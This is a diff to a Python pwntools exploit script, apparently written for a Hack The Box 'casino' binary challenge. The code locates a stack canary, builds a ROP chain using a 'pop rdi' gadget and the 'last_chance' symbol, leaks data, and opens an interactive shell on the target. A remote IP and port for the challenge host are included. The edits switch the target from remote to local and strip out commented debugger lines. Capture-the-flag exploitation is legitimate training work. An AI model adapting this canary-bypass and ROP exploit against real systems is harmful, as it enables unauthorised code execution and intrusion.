@@ -45,7 +45,7 @@ class CasinoPwn(PwnTarget):
         saved_canary_address = cyclic_find(saved_canary_value)
         cls.logger.success(f'saved_canary_address@{hex(saved_canary_address)}')
 
-
+    @classmethod
     def find_canary_alternative(cls, config: Config):
         cls.logger.disable('__main__')
         done = False
@@ -98,15 +98,15 @@ class CasinoPwn(PwnTarget):
 if __name__ == '__main__':
     remote_config = Config(
         rop=True,
-        mode=Mode.remote,
+        mode=Mode.local,
         ip=ipaddress.IPv4Address('178.128.172.18'),
         port=31126,
-        file=pathlib.Path('/home/lim8en1/htb/projects/casino/challenge/casino'),
+        file=pathlib.Path('/home/lim8en1/htb/projects-archive/casino/challenge/casino'),
         offset=0x28,
         libc='libc6_2.27-3ubuntu1.4_amd64',
         # libc='libc6_2.28-10+deb10u1_amd64',
     )
-    payload_size, t = CasinoPwn.find_canary_alternative(remote_config)
+    payload_size, t = CasinoPwn.find_canary_alternative(config=remote_config)
     last_chance_address = t.file.symbols['last_chance']
     pop_rdi = t.rop.find_gadget(['pop rdi', 'ret']).address + t.base_address_fix
 
@@ -131,11 +131,6 @@ if __name__ == '__main__':
             p64(last_chance_address)
     )
     payload = t.create_payload(rop_chain)
-    # payload += (payload_size - len(payload) - 0x20) * b'K' + p64(t.canary)
-    # debugger.interrupt_and_wait()
-    # debugger.execute('thread 2')
-    # debugger.execute('break *last_chance+86')
-    # debugger.execute('c')
     t.process.sendline(payload)
     data = t.process.recvline()[:-1]
     if len(data) > 8:
@@ -164,7 +159,6 @@ if __name__ == '__main__':
     )
     payload = t.create_payload(rop_chain)
     payload = t.create_payload(rop_chain)
-    # payload += (payload_size - len(payload) - 0x20) * b'K' + p64(t.canary)
     print(t.process.clean().decode())
     t.process.sendline(payload)
     t.process.interactive()
